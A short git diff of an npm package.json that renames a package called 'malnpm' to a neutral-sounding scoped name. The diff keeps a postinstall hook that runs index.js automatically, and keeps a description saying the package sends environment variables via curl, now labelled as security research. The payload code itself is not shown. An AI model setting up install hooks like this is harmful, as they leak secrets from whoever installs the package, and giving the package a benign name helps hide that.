@@ -1,7 +1,7 @@
 {
-  "name": "malnpm",
+  "name": "@jadoonf/env-reader-package",
   "version": "1.0.0",
-  "description": "A project to send environment variables via curl",
+  "description": "A project to send environment variables via curl. Meant for security research purposes.",
   "main": "index.js",
   "scripts": {
     "postinstall": "node index.js"
